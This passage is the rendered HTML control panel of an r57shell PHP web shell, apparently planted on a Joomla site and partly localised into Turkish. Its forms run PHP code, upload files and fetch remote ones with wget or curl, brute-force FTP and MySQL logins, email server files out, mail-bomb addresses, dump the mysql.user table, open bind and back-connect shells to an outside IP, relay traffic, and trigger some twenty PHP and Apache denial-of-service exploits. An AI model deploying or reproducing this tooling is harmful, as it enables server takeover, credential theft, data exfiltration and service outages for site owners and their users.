//file_get_content("/etc/passwd");</textarea><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"><input type=hidden name=cmd value="php_eval"><br>&nbsp;<input type=submit name=submit value="Uygula"></div></div></font></td></tr></form><form name=upload method=POST ENCTYPE=multipart/form-data><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id30');">Servere Dosya Upload Et</a> ::</div></b></font></td></tr><tr><td><div id="id30"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile0 size=85 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>&nbsp;Yeni ad <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=checkbox name=nf1 id=nf1 value="1"><input type=text name=new_name size=82 value=""><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Yukle"></td></tr></table></div></td></tr></form><form name=upload method=POST ENCTYPE=multipart/form-data><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id34');">Multy Servere Dosya Upload Et</a> ::</div></b></font></td></tr><tr><td><div id="id34" style="display: none;"><table class=table1 width=100% align=center><tr><td valign=top width=50%><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile1 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile2 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile3 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile4 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile5 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile6 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile7 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile8 size=35 value=""></td></tr></table></td><td valign=top width=50%><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile9 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile10 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile11 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile12 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile13 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile14 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=file name=userfile15 size=35 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right></td><td class=td1 align=left><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Yukle"></td></tr></table></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id31');">Uzaktan servere dosya yukle</a> ::</div></b></font></td></tr><tr><td><div id="id31"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>ile <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select size="1" name="with"><option value="fopen">fopen</option><option value="wget">wget</option><option value="lynx">lynx</option><option value="links">links</option><option value="curl">curl</option><option value="GET">GET</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;<b>Uzak Dosya <font face=Webdings color=gray>4</font></b><input type=text name=rem_file size=78 value="http://"></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Yerel Dosya <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=loc_file size=105 value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Yukle"></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id32');">Download files from server</a> ::</div></b></font></td></tr><tr><td><div id="id32"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Dosya <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=d_name size=85 value="/home/users/moje-www/public_html/joomla"><input type=hidden name=cmd value="download_file"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Download"></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Archivation <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=radio name=compress value="none" checked> without arch.<input type=radio name=compress value="zip"> zip<input type=radio name=compress value="gzip"> gzip<input type=radio name=compress value="bzip"> bzip</td></tr></table></div></td></tr></form><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id33');">FTP</a> ::</div></b></font></td></tr><tr><td><div id="id33" style="display: none;"><table class=table1 width=100% align=center><tr><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>FTP-bruteforce</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>server:port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_server_port size=20 value="127.0.0.1:21"><input type=hidden name=cmd value="ftp_brute"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=radio name=brute_method value="passwd" checked><font face=Verdana size=-2>/etc/passwd ( <a href=/index.php?users>Users list</a> )</font></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=checkbox name=reverse id=reverse value="1" checked>Use reverse (user -> resu)</td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=radio name=brute_method value="dic">Dictionary</td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Kullanici <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_login value="root"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Dictionary <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=dictionary value="/home/users/moje-www/public_html/joomla/passw.dic"></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Uygula"></td></tr></table></td></form><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Download files from remote ftp-server</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>server:port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_server_port size=20 value="127.0.0.1:21"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Kullanici <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_login size=20 value="anonymous"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Sifre <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_password size=20 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>File on ftp <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_file size=20 value="/ftp-dir/file"><input type=hidden name=cmd value="ftp_file_down"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Yerel Dosya <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=loc_file size=20 value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Transfer mode <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Download"></td></tr></table></td></form><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Send file to remote ftp server</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>server:port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_server_port size=20 value="127.0.0.1:21"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Kullanici <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_login size=20 value="anonymous"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Sifre <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_password size=20 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Yerel Dosya <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=loc_file size=20 value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>File on ftp <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ftp_file size=20 value="/ftp-dir/file"><input type=hidden name=cmd value="ftp_file_up"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Transfer mode <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Yukle"></td></tr></table></td></form></tr></div></table><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id35');">Mail</a> ::</div></b></font></td></tr><tr><td><div id="id35" style="display: none;"><table class=table1 width=100% align=center><tr><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Send email</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>To <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=to size=30 value="hacker@mail.com"><input type=hidden name=cmd value="mail"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>From <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=from size=30 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Subj <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=subj size=30 value="hello billy"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Mail <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><textarea name=text cols=22 rows=2>mail text here</textarea></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Send"></td></tr></table></td></form><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Send file to email</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>To <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=to size=30 value="hacker@mail.com"><input type=hidden name=cmd value="mail_file"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>From <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=from size=30 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Subj <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=subj size=30 value="file from r57shell"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Yerel Dosya <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=loc_file size=30 value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Archivation <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=radio name=compress value="none" checked> without arch.<input type=radio name=compress value="zip"> zip<input type=radio name=compress value="gzip"> gzip<input type=radio name=compress value="bzip"> bzip</td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Send"></td></tr></table></td></form><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Mail Bomber</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>To <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=to size=30 value="hacker@mail.com"><input type=hidden name=cmd value="mail_bomber"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>From <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=from size=30 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Subj <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=subj size=30 value="hello billy"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Mail <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><textarea name=text cols=22 rows=1>flood text here</textarea></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Flood <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=int name=mail_flood size=5 value="100">&nbsp;&nbsp;&nbsp;&nbsp;<b>Size(kb) <font face=Webdings color=gray>4</font></b><input type=int name=mail_size size=5 value="10"></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Send"></td></tr></table></td></form></tr></div></table><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id36');">Databases</a> ::</div></b></font></td></tr><tr><td><div id="id36"><table class=table1 width=100% align=center><tr><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Database-bruteforce</div></b></font><tr class=tr1><td class=td1 width=35% align=right><b>Cesit <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select name=db><option>MySQL</option><option>PostgreSQL</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"><input type=hidden name=cmd value="db_brute"></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>SQL-Server : Port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=db_server size=8 value="localhost"> <b>:</b> <input type=text name=db_port size=8 value="3306"></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>Tablo <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=mysql_db size=8 value="mysql"></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=radio name=brute_method value="passwd" checked><font face=Verdana size=-2>/etc/passwd ( <a href=/index.php?users>Users list</a> )</font></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=checkbox name=reverse id=reverse value="1" checked>Use reverse (user -> resu)</td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=radio name=brute_method value="dic">Dictionary</td></tr><tr class=tr1><td class=td1 width=35% align=right><b>Kullanici <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=mysql_l size=8 value="root"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Dictionary <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=dictionary value="/home/users/moje-www/public_html/joomla/passw.dic"></td></tr><tr class=tr1><td class=td1 width=35% align=right></td><td class=td1 align=left><input type=submit name=submit value="Uygula"></td></tr></table></td></form><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>SQL Sorgusu Yap</div></b></font><tr class=tr1><td class=td1 width=35% align=right><b>Cesit <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select name=db><option>MySQL</option><option>PostgreSQL</option></select></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>SQL-Server : Port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=db_server size=8 value="localhost"> <b>:</b> <input type=text name=db_port size=8 value="3306"></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>Kullanici : Sifre <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=mysql_l size=8 value="root"> <b>:</b> <input type=text name=mysql_p size=8 value="password"></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>Database[VeriTabani] <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=mysql_db size=8 value="mysql"> <b>.</b> <input type=text name=mysql_tbl size=8 value="user"></td></tr><tr class=tr1><td class=td1 width=35% align=right><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"><input type=hidden name=cmd value="mysql_dump"><b>DB dosyalarini kaydet.[Dump filed] <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=checkbox name=dif id=dif value="1"><input type=text name=dif_name size=17 value="dump.sql"></td></tr><tr class=tr1><td class=td1 width=35% align=right></td><td class=td1 align=left><input type=submit name=submit value="Dump"></td></tr></table></td></form><form name=form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>SQL Sorgusu Yap</div></b></font><tr class=tr1><td class=td1 width=35% align=right><b>Cesit <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select name=db><option>MySQL</option><option>PostgreSQL</option></select></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>SQL-Server : Port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=db_server size=8 value="localhost"> <b>:</b> <input type=text name=db_port size=8 value="3306"></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>Kullanici : Sifre <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=mysql_l size=8 value="root"> <b>:</b> <input type=text name=mysql_p size=8 value="password"></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>Tablo <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=mysql_db size=8 value="mysql"></td></tr><tr class=tr1><td class=td1 width=35% align=right><b>SQL Sorgusu <font face=Webdings color=gray>4</font></b><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"><input type=hidden name=cmd value="db_query"></td><td class=td1 align=left></td></tr></table><div align=center id='n'><textarea cols=30 rows=4 name=db_query>SHOW DATABASES;
SHOW TABLES;
SELECT * FROM user;
SELECT version();
SELECT user();</textarea><br><input type=submit name=submit value="Uygula"></div></td></form></tr></div></table><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id37');">Net</a> ::</div></b></font></td></tr><tr><td><div id="id37" style="display: none;"><table class=table1 width=100% align=center><tr><form name=form method=POST><td valign=top width=25%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Porta baglan /bin/bash</div></b></font><tr class=tr1><td class=td1 width=40% align=right><b>Port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=port size=10 value="11457"></td></tr><tr class=tr1><td class=td1 width=40% align=right><b>Sifre Giris <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=bind_pass size=10 value="r57"></td></tr><tr class=tr1><td class=td1 width=40% align=right><b>Kullan <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=40% align=right></td><td class=td1 align=left><input type=submit name=submit value="Baglan"></td></tr></table></td></form><form name=form method=POST><td valign=top width=25%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Back-Connect</div></b></font><tr class=tr1><td class=td1 width=40% align=right><b>IP <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=ip size=15 value="81.88.49.17"></td></tr><tr class=tr1><td class=td1 width=40% align=right><b>Port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=port size=15 value="11457"></td></tr><tr class=tr1><td class=td1 width=40% align=right><b>Kullan <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=40% align=right></td><td class=td1 align=left><input type=submit name=submit value="Baglan"></td></tr></table></td></form><form name=form method=POST><td valign=top width=25%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>datapipe</div></b></font><tr class=tr1><td class=td1 width=40% align=right><b>Yerel Port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=local_port size=10 value="11457"></td></tr><tr class=tr1><td class=td1 width=40% align=right><b>Uzak Host <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=remote_host size=10 value="irc.dalnet.ru"></td></tr><tr class=tr1><td class=td1 width=40% align=right><b>Uzak Port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=remote_port size=10 value="6667"></td></tr><tr class=tr1><td class=td1 width=40% align=right><b>Kullan <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select size="1" name="use"><option value="Perl">datapipe.pl</option><option value="C">datapipe.c</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=40% align=right></td><td class=td1 align=left><input type=submit name=submit value="Iste"></td></tr></table></td></form><form name=form method=POST><td valign=top width=25%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Proxy</div></b></font><tr class=tr1><td class=td1 width=40% align=right><b>Port <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=proxy_port size=10 value="31337"></td></tr><tr class=tr1><td class=td1 width=40% align=right><b>Kullan <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><select size="1" name="use"><option value="Perl">Perl</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr><tr class=tr1><td class=td1 width=40% align=right></td><td class=td1 align=left><input type=submit name=submit value="Iste"></td></tr></table></td></form></tr></div></table><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id38');">DoS</a> ::</div></b></font></td></tr><tr><td><div id="id38" style="display: none;"><table class=table1 width=100% align=center><tr><td valign=top width=50%><table class=table1 width=100% align=center><font face=Verdana color=red size=-2><b><div align=center id='n'>Danger! Web-daemon crash possible.</div></b></font><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos1"><input type=submit name=submit value="Recursive memory exhaustion"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos2"><input type=submit name=submit value="Memory_limit exhaustion in [ pack() ] function"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos3"><input type=submit name=submit value="BoF in [ unserialize() ] function"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos4"><input type=submit name=submit value="Limit integer calculate (65535) in ZendEngine"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos5"><input type=submit name=submit value="SQlite [ dl() ] vulnerability"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos6"><input type=submit name=submit value="PCRE [ preg_match() ] exhaustion resources (PHP <5.2.1)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos7"><input type=submit name=submit value="Memory_limit exhaustion in [ str_repeat() ] function (PHP <4.4.5,5.2.1)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos8"><input type=submit name=submit value="Apache process killer"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos9"><input type=submit name=submit value="Overload inodes from HD.I via [ tempnam() ] (PHP 4.4.2, 5.1.2)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos10"><input type=submit name=submit value="BoF in [ wordwrap() ] function (PHP <4.4.2,5.1.2)"></form></td></tr></table></td><td valign=top width=50%><table class=table1 width=100% align=center><font face=Verdana color=red size=-2><b><div align=center id='n'>Danger! Web-daemon crash possible.</div></b></font><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos11"><input type=submit name=submit value="BoF in [ array_fill() ] function (PHP <4.4.2,5.1.2)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos12"><input type=submit name=submit value="BoF in [ substr_compare() ] function (PHP <4.4.2,5.1.2)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos13"><input type=submit name=submit value="Array Creation in [ unserialize() ] 64 bit function (PHP <5.2.1)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos14"><input type=submit name=submit value="BoF in [ str_ireplace() ] function (PHP <5.2.x)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos15"><input type=submit name=submit value="BoF in [ htmlentities() ] function (PHP <5.1.6,4.4.4)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos16"><input type=submit name=submit value="Integer Overflow in [ zip_entry_read() ] function (PHP <4.4.5)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos17"><input type=submit name=submit value="BoF in [ sqlite_udf_decode_binary() ] function (PHP <4.4.5,5.2.1)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos18"><input type=submit name=submit value="Memory Allocation BoF in [ msg_receive() ] function (PHP <4.4.5,5.2.1)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos19"><input type=submit name=submit value="Off By One in [ php_stream_filter_create() ] function (PHP 5<5.2.1)"></form></td></tr><tr class=tr1><td class=td1 width=10% align=right></td><td class=td1 align=left><form name=form method=POST><input type=hidden name=cmd value="dos20"><input type=submit name=submit value="Reference Counter Overflow in [ unserialize() ] function (PHP <4.4.4)"></form></td></tr></table></td></tr></div></table>
